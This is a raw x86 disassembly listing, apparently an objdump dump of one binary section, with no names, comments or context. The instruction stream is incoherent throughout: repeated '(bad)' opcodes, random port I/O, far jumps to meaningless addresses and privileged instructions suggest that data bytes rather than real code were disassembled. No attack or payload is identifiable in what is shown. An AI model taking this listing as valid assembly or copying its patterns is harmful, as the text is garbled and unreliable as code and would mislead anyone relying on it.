  421c58:	xchg   BYTE PTR [esi+0x10],al
  421c5b:	push   ebx
  421c5c:	or     eax,0x934e3802
  421c61:	fsubr  QWORD PTR [esi-0x79]
  421c64:	test   BYTE PTR [esp+0x24],dh
  421c68:	cld    
  421c69:	push   edx
  421c6a:	or     DWORD PTR [edi+0x12],esp
  421c6d:	in     al,0x1f
  421c6f:	inc    esi
  421c70:	jmp    0x421c72
  421c72:	stc    
  421c73:	nop
  421c74:	or     edi,edx
  421c76:	in     eax,0x51
  421c78:	mov    al,ds:0x9882c75d
  421c7d:	push   edi
  421c7e:	push   edi
  421c7f:	jb     0x421c07
  421c81:	inc    esi
  421c82:	fbld   TBYTE PTR [ebx-0x7a9418c7]
  421c88:	mov    ah,0x63
  421c8a:	mov    ah,0x3c
  421c8c:	cld    
  421c8d:	add    cl,BYTE PTR [edi]
  421c8f:	pop    esi
  421c90:	ret    0x19dc
  421c93:	or     BYTE PTR [ebp+0xc5428b],bh
	...
  421d11:	add    BYTE PTR [eax],al
  421d13:	add    BYTE PTR [ebx-0x62],ah
  421d16:	mov    esi,0xff63ff63
  421d1b:	sahf   
  421d1c:	and    eax,0xf0989286
  421d21:	out    0x9b,al
  421d23:	(bad)  
  421d24:	sub    DWORD PTR [ecx+eax*1+0x76c00],esi
  421d2b:	add    BYTE PTR [eax+esi*1-0x3e],bl
  421d2f:	into   
  421d30:	pushf  
  421d31:	mov    edi,0x38f56ab7
  421d36:	dec    esi
  421d37:	outs   dx,DWORD PTR ds:[esi]
  421d38:	ror    ecx,cl
  421d3a:	push   ds
  421d3b:	mov    esi,0x6a6f0e1a
  421d40:	clc    
  421d41:	sub    BYTE PTR [esi+0x186dbd9],0x42
  421d48:	arpl   WORD PTR [edi],si
  421d4a:	enter  0xb412,0x63
  421d4e:	idiv   BYTE PTR [ebx+eax*2-0x63a94cb4]
  421d55:	test   BYTE PTR [edi+0x1cbb00c5],0x2
  421d5c:	push   ebp
  421d5d:	mov    al,ds:0x49e4e35d
  421d62:	imul   edx,esp,0x5e
  421d65:	(bad)
  421d68:	pop    ebp
  421d69:	xchg   ecx,esi
  421d6b:	jecxz  0x421d60
  421d6d:	(bad)  
  421d6e:	cmp    dh,dh
  421d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d72:	push   edi
  421d73:	out    0x5b,al
  421d75:	or     BYTE PTR [edx],ah
  421d77:	push   esi
  421d78:	popfw  
  421d7a:	sar    DWORD PTR [edi+0x1a],cl
  421d7d:	sub    DWORD PTR [ecx+0x33cbed15],ecx
  421d83:	add    BYTE PTR [edi+edx*2],cl
  421d86:	add    DWORD PTR [ecx-0x77c5283a],ebp
  421d8c:	and    al,0x39
  421d8e:	sub    eax,0xecd10e3a
  421d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d94:	stos   BYTE PTR es:[edi],al
  421d95:	call   0x4dda:0xf9c9de81
  421d9c:	mov    edi,0x47c1767f
  421da1:	arpl   di,di
  421da3:	push   0x22e4b70c
  421da8:	push   DWORD PTR [edx-0x2023ad42]
  421dae:	xor    al,0x24
  421db0:	push   ds
  421db1:	push   ecx
  421db2:	mov    al,0xf5
  421db4:	popf   
  421db5:	cs (bad) 
  421db7:	fstp   TBYTE PTR [esi-0x5443dff3]
  421dbd:	inc    edx
  421dbe:	(bad)  
  421dbf:	cmp    dh,bh
  421dc1:	sub    BYTE PTR [ebx],dl
  421dc3:	sub    BYTE PTR [edx+0x73fcfe4a],cl
  421dc9:	xchg   ebp,eax
  421dca:	mov    eax,0x45cd6a7e
  421dcf:	sub    ch,BYTE PTR [ebx+0x4a]
  421dd2:	or     esp,DWORD PTR [edx]
  421dd4:	loopne 0x421de2
  421dd6:	jg     0x421d5b
  421dd8:	mov    ds:0xfee97f80,eax
  421ddd:	fsubr  DWORD PTR [edi+0x2f]
  421de0:	push   edi
  421de1:	(bad)  
  421de2:	fdivr  QWORD PTR [ebx+0x2f]
  421de5:	ins    BYTE PTR es:[edi],dx
  421de6:	stos   DWORD PTR es:[edi],eax
  421de7:	jb     0x421e26
  421de9:	adc    al,0xc3
  421deb:	test   DWORD PTR [ebp+0x658dd51a],0x5f6448db
  421df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421df6:	or     eax,0x75c529a9
  421dfb:	mov    eax,ds:0x2788dadf
  421e00:	jno    0x421e06
  421e02:	adc    edx,ebx
  421e04:	or     cl,ah
  421e06:	outs   dx,BYTE PTR ds:[esi]
  421e07:	rcl    BYTE PTR [edi-0xc9d3e7f],0xab
  421e0e:	rcl    BYTE PTR [ebx],0xb1
  421e11:	out    dx,eax
  421e12:	and    BYTE PTR [edx+0x7dde3e23],0x77
  421e19:	or     cl,BYTE PTR [eax+ecx*2-0x286535e0]
  421e20:	aad    0xfc
  421e22:	test   dh,0xbf
  421e25:	jnp    0x421dfb
  421e27:	inc    esp
  421e28:	out    0xa9,eax
  421e2a:	in     al,dx
  421e2b:	in     eax,dx
  421e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e2d:	out    dx,al
  421e2e:	ror    BYTE PTR [esi-0x2eb19e95],0x35
  421e35:	pop    es
  421e36:	pop    ds
  421e37:	or     dl,al
  421e39:	fidiv  DWORD PTR [edx+edx*4]
  421e3c:	lds    ebx,FWORD PTR [eax]
  421e3e:	(bad)  
  421e40:	aam    0x27
  421e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e43:	cmp    eax,0xf792f14e
  421e48:	dec    ebp
  421e49:	mov    esp,esp
  421e4b:	push   ecx
  421e4c:	retf   
  421e4d:	fwait
  421e4e:	outs   dx,BYTE PTR ds:[esi]
  421e4f:	push   ebx
  421e50:	mov    ecx,eax
  421e52:	or     edi,eax
  421e54:	cmp    eax,0x1ca2d069
  421e59:	loope  0x421e40
  421e5b:	cmp    BYTE PTR [ebx+0x27ccf6ac],0xc7
  421e62:	jg     0x421eab
  421e64:	call   0xd84d3440
  421e69:	shl    ah,cl
  421e6b:	pop    ss
  421e6c:	mov    bh,0x70
  421e6e:	mov    DWORD PTR [edx-0x5856e7f7],edx
  421e74:	jecxz  0x421eec
  421e76:	rcr    DWORD PTR [eax+edx*8],cl
  421e79:	fmul   QWORD PTR [ecx]
  421e7b:	mov    edi,0x85635448
  421e80:	cmp    DWORD PTR [edx-0x2e011c97],0x41cbce43
  421e8a:	retf   0xd175
  421e8d:	dec    esp
  421e8e:	dec    ebx
  421e8f:	pop    edx
  421e90:	inc    ecx
  421e91:	push   cs
  421e92:	sub    al,0xce
  421e94:	adc    ah,BYTE PTR [ebp-0x7eaccecd]
  421e9a:	ss push edx
  421e9c:	add    esi,DWORD PTR [esi-0x6]
  421e9f:	cmp    ebx,ebx
  421ea1:	add    ecx,eax
  421ea3:	jge    0x421ebe
  421ea5:	ret    0x7710
  421ea8:	iret   
  421ea9:	ins    BYTE PTR es:[edi],dx
  421eaa:	mov    ebp,edx
  421eac:	and    DWORD PTR [esi+0x322f1213],ebp
  421eb2:	fldenv [ecx]
  421eb4:	(bad)  
  421eb5:	mov    edx,0x18d5af4b
  421eba:	jmp    0xb3b3b1d3
  421ebf:	lods   eax,DWORD PTR ds:[esi]
  421ec0:	jl     0x421ec8
  421ec2:	dec    edx
  421ec3:	mov    edi,DWORD PTR [edx+0x50d79ec9]
  421ec9:	cmp    DWORD PTR [ebx+0x68],esi
  421ecc:	jmp    0x421eec
  421ece:	cwde   
  421ecf:	pop    edx
  421ed0:	jbe    0x421efc
  421ed2:	lds    ecx,FWORD PTR [ecx+0x3119a9b8]
  421ed8:	inc    eax
  421ed9:	push   0x28
  421edb:	inc    esp
  421edc:	sub    ecx,DWORD PTR [eax-0x5c27a6be]
  421ee2:	xor    eax,0xab010853
  421ee7:	push   ss
  421ee8:	mov    bh,0x58
  421eea:	dec    esp
  421eeb:	mov    al,ds:0xe38b5856
  421ef0:	lods   eax,DWORD PTR ds:[esi]
  421ef1:	cs xchg esi,eax
  421ef3:	sub    edi,DWORD PTR [esi-0x2d121414]
  421ef9:	in     eax,0x20
  421efb:	daa    
  421efc:	cdq    
  421efd:	rcr    BYTE PTR [ecx+edx*1],1
  421f00:	sbb    eax,0xadb8f612
  421f05:	xchg   BYTE PTR [ebp-0x56],cl
  421f08:	shl    BYTE PTR [edx+ecx*1-0x22],0xaf
  421f0d:	add    dl,al
  421f0f:	out    0x1d,al
  421f11:	push   ebp
  421f12:	or     ecx,DWORD PTR [edx]
  421f14:	in     eax,0xba
  421f16:	imul   DWORD PTR [eax]
  421f18:	cmp    ah,BYTE PTR [esi]
  421f1a:	ret    
  421f1b:	sub    edi,DWORD PTR [esi]
  421f1d:	and    al,dh
  421f1f:	jmp    0x421f1a
  421f21:	lock fld DWORD PTR [ebp+0xd]
  421f25:	jge    0x421f5c
  421f27:	shl    BYTE PTR [ebx],1
  421f29:	add    edx,edi
  421f2b:	pop    es
  421f2c:	pusha  
  421f2d:	lock push esp
  421f2f:	and    al,BYTE PTR [eax]
  421f31:	jmp    0x93ae36c1
  421f36:	data16 mov al,0x82
  421f39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f3a:	rcr    BYTE PTR [ebx],1
  421f3c:	mov    esi,0x6367ccdf
  421f41:	jae    0x421efd
  421f43:	mov    ch,0x55
  421f45:	std    
  421f46:	mov    ebx,0x67e46cfb
  421f4b:	mov    esi,0x26dc21da
  421f50:	pushf  
  421f51:	outs   dx,DWORD PTR ds:[esi]
  421f52:	inc    edi
  421f53:	pop    ebp
  421f54:	pushf  
  421f55:	jle    0x421f3b
  421f57:	xchg   edi,eax
  421f58:	push   ds
  421f59:	fmul   QWORD PTR ds:0x45315f35
  421f60:	scas   eax,DWORD PTR es:[edi]
  421f61:	jmp    0xc600ccd3
  421f66:	xor    cl,BYTE PTR [ebx-0xc]
  421f69:	dec    ebx
  421f6a:	lds    eax,FWORD PTR [esp]
  421f6d:	scas   al,BYTE PTR es:[edi]
  421f6e:	or     DWORD PTR [esi+0x58c386cb],esp
  421f74:	leave  
  421f75:	dec    ebp
  421f76:	or     eax,0x9b101ce
  421f7b:	cmp    ah,dh
  421f7d:	mov    ds,WORD PTR [esi]
  421f7f:	dec    ecx
  421f80:	mov    eax,0x2c039dfc
  421f85:	add    esi,edx
  421f87:	sub    bl,cl
  421f89:	push   esi
  421f8a:	dec    esp
  421f8b:	xor    al,0x7b
  421f8d:	imul   edx,DWORD PTR [ebp-0x3653506f],0xcc80c2b4
  421f97:	fsubr  QWORD PTR [edi-0x6ba47343]
  421f9d:	adc    dl,ch
  421f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fa0:	int    0xb4
  421fa2:	jp     0x421f52
  421fa4:	es fldz 
  421fa7:	aaa    
  421fa8:	jb     0x421f83
  421faa:	jmp    0x421ff6
  421fac:	js     0x422025
  421fae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421faf:	in     al,0x76
  421fb1:	pusha  
  421fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fb4:	lock jno 0x421f8f
  421fb7:	push   esi
  421fb8:	fstp   TBYTE PTR [edx-0x4b]
  421fbb:	cld    
  421fbc:	inc    edx
  421fbd:	icebp  
  421fbe:	mov    ebx,0x45e408f6
  421fc3:	shl    DWORD PTR [ebx+ecx*8+0x5dfa7b9d],cl
  421fca:	mov    ebp,0x222fdf23
  421fcf:	cmp    edi,DWORD PTR [edx]
  421fd1:	popa   
  421fd2:	ds mov ah,0x2e
  421fd5:	pop    ebp
  421fd6:	push   es
  421fd7:	mov    ebx,0xa2c86a7b
  421fdc:	fist   WORD PTR [edi]
  421fde:	and    eax,0xe3bed36c
  421fe3:	int    0x30
  421fe5:	sub    edx,DWORD PTR [edx]
  421fe7:	xor    eax,0x8ae181cd
  421fec:	int    0x9c
  421fee:	dec    esp
  421fef:	out    0xf2,eax
  421ff1:	dec    ecx
  421ff2:	xchg   BYTE PTR [edi-0x13e24d45],bl
  421ff8:	fs mov dh,0xa5
  421ffb:	jmp    0x8be7:0xa591b6b
  422002:	ds adc al,0xec
  422005:	sub    ebp,DWORD PTR [ebx-0x2df235fd]
  42200b:	dec    ebx
  42200c:	add    DWORD PTR [edx-0x43d2889],esp
  422012:	sub    cl,al
  422014:	test   DWORD PTR [ecx+0x2c],esi
  422017:	cmc    
  422018:	bswap  esp
  42201a:	ja     0x421fa7
  42201c:	push   0x175ebdcc
  422021:	dec    ebp
  422022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422023:	mov    eax,0xfb89c223
  422028:	pop    ebx
  422029:	lahf   
  42202a:	in     al,0xbf
  42202c:	pop    ecx
  42202d:	push   esi
  42202e:	outs   dx,BYTE PTR ds:[esi]
  42202f:	dec    eax
  422030:	pop    ebp
  422031:	pop    edx
  422032:	mov    ds,WORD PTR [edi-0xe]
  422035:	repnz (bad) 
  422037:	mov    bl,0xa5
  422039:	or     eax,0xe55a51ea
  42203e:	mov    ebx,0x9c68d437
  422043:	mov    cl,0xb
  422046:	lock cmp al,0xd5
  422049:	mov    ds,WORD PTR [edx]
  42204b:	test   cl,al
  42204d:	or     al,0x27
  42204f:	mov    bh,0x72
  422051:	mov    dl,0xe0
  422053:	es inc ebp
  422055:	pop    esi
  422056:	adc    BYTE PTR [eax],bh
  422058:	mov    dh,0xf7
  42205a:	push   0xffffffd3
  42205c:	fcmovu st,st(6)
  42205e:	in     al,0x9c
  422060:	inc    ecx
  422061:	test   BYTE PTR [ebx],al
  422063:	sub    al,0xae
  422065:	and    eax,0xffffffba
  422068:	(bad)  
  422069:	stc    
  42206a:	add    eax,0x9f1b8437
  42206f:	stc    
  422070:	inc    ebx
  422071:	shr    bl,cl
  422073:	sbb    ebp,DWORD PTR [edi-0x600a0ea4]
  422079:	test   edi,esp
  42207b:	fist   WORD PTR [esi+0x60b61b0a]
  422081:	out    0x69,eax
  422083:	or     ebp,DWORD PTR [eax]
  422085:	cmp    DWORD PTR [ebx-0x5f],ebx
  422088:	pop    esp
  422089:	std    
  42208a:	push   0xd24024c6
  42208f:	fidivr DWORD PTR ds:0x94bc338
  422095:	rol    DWORD PTR [ebp+0x1df31918],1
  42209b:	cmp    eax,0x43b4fb50
  4220a0:	pop    edi
  4220a1:	push   0x8a5f93b8
  4220a6:	dec    ebx
  4220a7:	aaa    
  4220a8:	(bad)  
  4220aa:	xor    BYTE PTR [edi-0x23cebc20],dl
  4220b0:	mov    eax,0x1b5070dd
  4220b5:	stc    
  4220b6:	lea    esi,ds:0xa3055925
  4220bc:	mov    ebp,0x58a25956
  4220c1:	mov    edx,0xd46131b5
  4220c6:	out    dx,eax
  4220c7:	pop    ebx
  4220c8:	clc    
  4220c9:	mov    edi,0x1aafa531
  4220ce:	jmp    0x4220fd
  4220d0:	xchg   edx,eax
  4220d1:	hlt    
  4220d2:	mov    ds:0xa3d6b487,al
  4220d7:	cwd    
  4220d9:	scas   al,BYTE PTR es:[edi]
  4220da:	jecxz  0x42211d
  4220dc:	cdq    
  4220dd:	xlat   BYTE PTR ds:[ebx]
  4220de:	stos   DWORD PTR es:[edi],eax
  4220df:	int    0xc9
  4220e1:	lds    edi,FWORD PTR [ecx-0x2233dcf3]
  4220e7:	xchg   edx,eax
  4220e8:	mov    cs,WORD PTR [eax+0x97caf46]
  4220ee:	jae    0x422107
  4220f0:	int    0xf2
  4220f2:	jmp    0x422091
  4220f4:	out    0x11,eax
  4220f6:	push   cs
  4220f7:	jmp    0x45dbbc1d
  4220fc:	push   edi
  4220fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220fe:	pop    esp
  4220ff:	xor    eax,DWORD PTR [ebx+0x650ae45]
  422105:	or     esi,DWORD PTR [ebp+0x4a68f2c]
  42210b:	ja     0x4220bd
  42210d:	adc    DWORD PTR [edx],ebp
  42210f:	fsubp  st(4),st
  422111:	iret   
  422112:	fucomip st,st(4)
  422114:	xchg   ebx,eax
  422115:	add    ah,BYTE PTR [ebx]
  422117:	sub    ah,BYTE PTR [ebx]
  422119:	lock rcl BYTE PTR [eax],cl
  42211c:	repz js 0x422140
  42211f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422120:	in     eax,0xf2
  422122:	arpl   cx,di
  422124:	xchg   edx,eax
  422125:	icebp  
  422126:	xchg   ebx,eax
  422127:	(bad)  
  422128:	fldcw  WORD PTR [ecx-0x23]
  42212b:	lea    esi,[edi+0x11]
  42212e:	xchg   esi,eax
  42212f:	pop    ebp
  422130:	fist   WORD PTR [ecx-0x75fa3438]
  422136:	mov    bl,0xe4
  422138:	js     0x4220e7
  42213a:	mov    ecx,0x57dc9ac3
  42213f:	lahf   
  422140:	cmp    eax,0xd5ff29d6
  422145:	aam    0x4e
  422147:	jg     0x4221bc
  422149:	enter  0xfde4,0xdb
  42214d:	aam    0x1d
  42214f:	fistp  WORD PTR [ecx]
  422151:	sub    eax,0x63743ff6
  422156:	dec    esp
  422157:	outs   dx,DWORD PTR ds:[esi]
  422158:	mov    bh,BYTE PTR [esi+0x70f35822]
  42215e:	mov    ?,edi
  422160:	iret   
  422161:	clc    
  422162:	ret    
  422163:	or     eax,DWORD PTR [ebp+0x227045c3]
  422169:	pop    eax
  42216a:	sub    eax,DWORD PTR [esi-0x36]
  42216d:	jae    0x4221b2
  42216f:	dec    ebx
  422170:	je     0x42211f
  422172:	ins    DWORD PTR es:[edi],dx
  422173:	inc    edx
  422174:	ret    
  422175:	js     0x422114
  422177:	mov    DWORD PTR [ebx],ebx
  422179:	ja     0x422148
  42217b:	cdq    
  42217c:	sbb    eax,0x5a177213
  422181:	or     ch,BYTE PTR [edx]
  422183:	sbb    DWORD PTR [edx+ecx*1-0x33ab7c4],esp
  42218a:	imul   ebp,DWORD PTR [ebx+ebp*4-0x34],0x3ef890db
  422192:	mov    WORD PTR [edi-0x80],gs
  422195:	or     BYTE PTR [edx+0x4f301143],al
  42219b:	aas    
  42219c:	les    edi,FWORD PTR [ecx+edx*8-0x46735f5c]
  4221a3:	jo     0x422200
  4221a5:	(bad)  
  4221a6:	dec    edi
  4221a7:	push   esi
  4221a8:	popa   
  4221a9:	aaa    
  4221aa:	fninit 
  4221ac:	adc    BYTE PTR [ecx+ebp*8-0xe385676],cl
  4221b3:	add    al,ah
  4221b5:	sub    DWORD PTR [eax-0x42f796bc],edi
  4221bb:	rcr    ecx,cl
  4221bd:	cmp    al,0x92
  4221bf:	push   esp
  4221c0:	add    eax,DWORD PTR [ecx]
  4221c2:	xchg   ebp,eax
  4221c3:	loope  0x4221bb
  4221c5:	push   esp
  4221c6:	fdiv   QWORD PTR [ecx-0x6d6f0608]
  4221cc:	arpl   WORD PTR [eax+0x50],bx
  4221cf:	scas   eax,DWORD PTR es:[edi]
  4221d0:	sub    edi,0x2a3bd0ab
  4221d6:	add    ah,BYTE PTR [edi+eiz*8+0x68]
  4221da:	push   eax
  4221db:	inc    esp
  4221dc:	dec    ecx
  4221dd:	cmp    ecx,DWORD PTR [edi]
  4221df:	mov    cl,0xa6
  4221e1:	fdivr  QWORD PTR ss:[ecx]
  4221e4:	out    dx,eax
  4221e5:	sbb    al,0x2
  4221e7:	mov    eax,ds:0x38eb147b
  4221ec:	in     eax,0x24
  4221ee:	or     esp,DWORD PTR [eax-0x45]
  4221f1:	xor    eax,0x840f00f9
  4221f6:	mov    bh,0xb8
  4221f8:	push   cs
  4221f9:	mov    WORD PTR [eax],es
  4221fb:	mov    ebp,0xcedf9032
  422200:	xlat   BYTE PTR ds:[ebx]
  422201:	push   ebp
  422202:	adc    al,0x18
  422204:	push   ebp
  422205:	lods   al,BYTE PTR ds:[esi]
  422206:	ror    DWORD PTR [esi],cl
  422208:	pop    edi
  422209:	fs sti 
  42220b:	push   esi
  42220c:	cwde   
  42220d:	and    ebp,DWORD PTR [edx+eiz*4+0xc]
  422211:	cmp    eax,0x2ff55031
  422216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422217:	push   edx
  422218:	add    BYTE PTR [esi+0x25],dh
  42221b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42221c:	fsubp  st(6),st
  42221e:	xor    al,0x4e
  422220:	pop    esp
  422221:	stos   DWORD PTR es:[edi],eax
  422222:	in     eax,0x86
  422224:	(bad)  
  422225:	int    0x2b
  422227:	dec    ecx
  422228:	push   ss
  422229:	pusha  
  42222a:	and    bl,bl
  42222c:	mov    cl,0x9f
  42222e:	adc    eax,0xd44b3cff
  422233:	mov    BYTE PTR [ebp-0x700b29dd],cl
  422239:	ret    0x3377
  42223c:	pusha  
  42223d:	rol    DWORD PTR [ebp-0x1b],1
  422240:	jecxz  0x4222a2
  422242:	vprotd ymm11,xmm2,xmm0
  422247:	adc    DWORD PTR [ebx+edx*2-0x30],eax
  42224b:	or     eax,0x98b1daa9
  422250:	sub    al,bl
  422252:	cmp    bh,al
  422254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422255:	out    0xef,eax
  422257:	push   ss
  422258:	push   esp
  422259:	and    BYTE PTR [edx-0x40114eac],ch
  42225f:	dec    edi
  422260:	das    
  422261:	xchg   esp,eax
  422262:	mov    ecx,0x5591b4a8
  422267:	ds dec edx
  422269:	inc    ebx
  42226a:	jle    0x42227c
  42226c:	sub    ah,BYTE PTR [eax-0x14f85e20]
  422272:	andnps xmm2,XMMWORD PTR [esi-0x13]
  422276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422277:	retf   0x19fc
  42227a:	push   esp
  42227b:	(bad)  
  42227c:	das    
  42227d:	cmp    dl,dh
  42227f:	in     al,0xe7
  422281:	aad    0xb8
  422283:	(bad)  
  422284:	jmp    0x42223c
  422286:	lods   al,BYTE PTR ds:[esi]
  422287:	sub    al,0x3e
  422289:	sbb    eax,0x2934b8a8
  42228e:	xchg   esp,eax
  42228f:	std    
  422290:	xchg   ebp,eax
  422291:	xchg   edx,eax
  422292:	lock out 0xa2,eax
  422295:	inc    DWORD PTR [edx]
  422297:	ja     0x422276
  422299:	mov    edx,0xf2416e36
  42229e:	dec    ebp
  42229f:	lahf   
  4222a0:	sbb    eax,eax
  4222a2:	ins    BYTE PTR es:[edi],dx
  4222a3:	sub    edx,DWORD PTR ds:[esp+ebp*2-0x1619097]
  4222ab:	mov    esi,0x9ceed032
  4222b0:	xlat   BYTE PTR ds:[ebx]
  4222b1:	fild   QWORD PTR gs:[esi]
  4222b4:	push   eax
  4222b5:	push   ebx
  4222b6:	jge    0x422273
  4222b8:	pop    es
  4222b9:	in     eax,dx
  4222ba:	lahf   
  4222bb:	add    ch,BYTE PTR [eax-0x2e]
  4222be:	pop    esi
  4222bf:	test   al,0xb9
  4222c1:	loop   0x42226f
  4222c3:	inc    ebx
  4222c4:	push   0xb7567d35
  4222c9:	enter  0x5309,0xcb
  4222cd:	cmp    esi,DWORD PTR [edi-0x28]
  4222d0:	xchg   BYTE PTR [eax],dl
  4222d2:	hlt    
  4222d3:	fiadd  DWORD PTR [edi]
  4222d5:	jmp    0xcd3:0xe31240f4
  4222dc:	sbb    DWORD PTR [ebx+0x4a13533b],ecx
  4222e2:	stc    
  4222e3:	jge    0x42230a
  4222e5:	xor    eax,0x9a205d
  4222ea:	pop    es
  4222eb:	mov    ebx,0x4b846e43
  4222f0:	inc    esi
  4222f1:	adc    BYTE PTR [eax+edi*4],al
  4222f4:	xchg   edi,ebp
  4222f6:	call   0xc458377c
  4222fb:	xchg   esi,ebx
  4222fd:	add    ah,BYTE PTR [ecx]
  4222ff:	or     DWORD PTR ss:[edx+eax*4-0x2],ebp
  422304:	cwde   
  422305:	popf   
  422306:	or     dl,dh
  422308:	in     eax,0xc
  42230a:	daa    
  42230b:	retf   
  42230c:	fdivr  DWORD PTR [ebx]
  42230e:	pop    es
  42230f:	adc    ch,BYTE PTR ds:0xccf1ebe
  422315:	sub    DWORD PTR [esi],ecx
  422317:	and    BYTE PTR [esp+eax*4],0x60
  42231b:	fadd   QWORD PTR [edx]
  42231d:	ss inc eax
  42231f:	mov    ds:0xcb7fb755,eax
  422324:	aam    0x40
  422326:	in     eax,0x4b
  422328:	or     DWORD PTR [edi],edi
  42232a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42232b:	pop    ebp
  42232c:	jnp    0x4223ab
  42232e:	mov    al,fs:0xb05dddc0
  422334:	or     al,0x2f
  422336:	jae    0x4222f9
  422338:	imul   ecx,DWORD PTR [ecx+0x52],0xffffffb7
  42233c:	mov    cl,0xeb
  42233e:	sbb    al,0x16
  422340:	mov    eax,0x9d30178d
  422345:	dec    edx
  422346:	ss sti 
  422348:	(bad)  
  422349:	fist   DWORD PTR [ecx+0x32]
  42234c:	(bad)  
  42234d:	out    dx,al
  42234e:	leave  
  42234f:	sahf   
  422350:	dec    edx
  422351:	xchg   ebp,eax
  422352:	adc    ah,BYTE PTR [edi+0x2755c0fd]
  422358:	scas   eax,DWORD PTR es:[edi]
  422359:	(bad)  
  42235b:	ins    BYTE PTR es:[edi],dx
  42235c:	xchg   BYTE PTR [ecx+0x20],bh
  42235f:	fidiv  WORD PTR [ebx]
  422361:	xchg   edx,ebp
  422363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422364:	xor    eax,0x95fd572c
  422369:	rcr    DWORD PTR [edx+0x76],cl
  42236c:	fs jno 0x4223d0
  42236f:	fld    QWORD PTR [edi+0x65]
  422372:	sub    eax,0x2ef28fdb
  422377:	pop    ds
  422378:	mov    eax,0xf9a5cf34
  42237d:	jg     0x42237f
  42237f:	cmp    DWORD PTR [esi+0x374c7988],esi
  422385:	sub    ecx,esi
  422387:	push   ebp
  422388:	mov    ebp,0x7f09f0
  42238d:	dec    esp
  42238e:	in     al,dx
  42238f:	retf   0xc3f3
  422392:	not    DWORD PTR [edx-0x48]
  422395:	jmp    edx
  422397:	xchg   edx,ebp
  422399:	push   ebx
  42239a:	xchg   edi,eax
  42239b:	lahf   
  42239c:	icebp  
  42239d:	xchg   ecx,eax
  42239e:	jmp    0x7b5:0xfe541f3d
  4223a5:	scas   eax,DWORD PTR es:[edi]
  4223a6:	mov    cl,0xb9
  4223a8:	add    al,0x36
  4223aa:	jmp    DWORD PTR [ecx]
  4223ac:	gs push ebp
  4223ae:	mov    al,ds:0xe8669a96
  4223b3:	in     eax,0x3
  4223b5:	mov    ebx,0xd352961e
  4223ba:	xor    DWORD PTR [eax-0x79],eax
  4223bd:	inc    esp
  4223be:	lea    edx,[ebx-0x4382a5e8]
  4223c4:	jae    0x422402
  4223c6:	or     DWORD PTR [edx+0x53],ebp
  4223c9:	(bad)  [ebx-0x401b220]
  4223cf:	shr    esi,cl
  4223d1:	imul   esp,DWORD PTR [esi-0x2],0xa0e5a5ab
  4223d8:	aaa    
  4223d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223da:	sar    BYTE PTR [ebx-0x4c],1
  4223dd:	out    dx,al
  4223de:	fiadd  DWORD PTR [edi-0x7b922085]
  4223e4:	mov    DWORD PTR [esi+esi*1+0x0],esp
  4223e8:	ret    0xf639
  4223eb:	aad    0x2a
  4223ed:	pop    edx
  4223ee:	hlt    
  4223ef:	sbb    al,0x9d
  4223f1:	pop    esi
  4223f2:	inc    esp
  4223f3:	inc    ebp
  4223f4:	xor    bh,BYTE PTR [ebx]
  4223f6:	dec    ebx
  4223f7:	sbb    eax,0xd9b7580f
  4223fc:	sub    bh,BYTE PTR [ecx-0x488f71b5]
  422402:	push   esp
  422403:	xchg   edx,eax
  422404:	sbb    BYTE PTR [eax-0x43],ah
  422407:	icebp  
  422408:	mov    DWORD PTR [ecx+0x27a39e48],edx
  42240e:	dec    eax
  42240f:	cmp    BYTE PTR [edx],ah
  422411:	cmp    eax,0x9c925e39
  422416:	bound  eax,QWORD PTR [ebx]
  422418:	xchg   esi,eax
  422419:	(bad)  
  42241a:	lods   al,BYTE PTR ds:[esi]
  42241b:	sahf   
  42241c:	jmp    0x12f53efb
  422421:	push   ds
  422422:	out    dx,al
  422423:	sub    eax,0x12573ff0
  422428:	das    
  422429:	dec    esp
  42242a:	cmp    ah,0xcf
  42242d:	inc    ecx
  42242e:	xlat   BYTE PTR ds:[ebx]
  42242f:	adc    eax,0x8299944
  422434:	das    
  422435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422436:	push   es
  422437:	and    edx,DWORD PTR [ecx]
  422439:	mov    esi,0xc9ca482c
  42243e:	ror    DWORD PTR [esi-0x2e],cl
  422441:	fisttp QWORD PTR fs:[eax+0xf]
  422445:	mov    al,ds:0x26dfa421
  42244a:	pop    esi
  42244b:	fs popf 
  42244d:	ret    0xa46b
  422450:	sub    al,0x88
  422452:	loop   0x42249d
  422454:	inc    esp
  422455:	out    dx,eax
  422456:	test   ax,0x8567
  42245a:	jmp    0xafe4dacc
  42245f:	push   0x254333f4
  422464:	mov    ebp,0x28a0b2a2
  422469:	das    
  42246a:	call   0x62b14223
  42246f:	fld    TBYTE PTR [esi-0x464428dc]
  422475:	pop    esp
  422476:	xor    eax,ebp
  422478:	jbe    0x4224b6
  42247a:	ds in  al,0xf2
  42247d:	inc    edx
  42247e:	imul   edi,ecx,0x59
  422481:	out    dx,eax
  422482:	xchg   esp,eax
  422483:	add    ebx,esp
  422485:	inc    esi
  422486:	sub    al,0xd5
  422488:	shr    BYTE PTR [esi+edi*8+0x1928d9f8],0x7a
  422490:	jmp    0x7181:0x3dcec08c
  422497:	and    eax,DWORD PTR [eax]
	...
  422511:	add    BYTE PTR [eax],al
  422513:	add    bh,al
  422515:	stc    
